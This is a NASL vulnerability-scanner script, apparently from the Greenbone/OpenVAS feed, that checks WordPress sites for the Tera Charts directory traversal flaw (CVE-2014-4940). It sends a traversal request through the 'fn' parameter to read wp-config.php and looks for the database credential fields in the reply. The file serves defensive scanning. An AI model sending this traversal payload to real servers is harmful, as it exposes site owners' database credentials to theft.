# Copyright (C) 2015 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805123");
  script_version("2023-03-01T10:20:04+0000");
  script_cve_id("CVE-2014-4940");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2015-01-13 12:03:15 +0530 (Tue, 13 Jan 2015)");
  script_name("WordPress Tera Charts Multiple Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://codevigilant.com/disclosure/wp-plugin-tera-chart-local-file-inclusion");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/68662");

  script_tag(name:"summary", value:"The WordPress plugin 'Tera Charts' is prone to multiple directory
  traversal vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The 'charts/treemap.php' and 'charts/zoomabletreemap.php' scripts
  are not properly sanitizing user input, specifically path traversal style attacks (e.g. '../') via
  the 'fn' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to download
  arbitrary files.");

  script_tag(name:"affected", value:"WordPress Tera Charts plugin version 0.1.");

  script_tag(name:"solution", value:"Update to version 1.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD"))) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);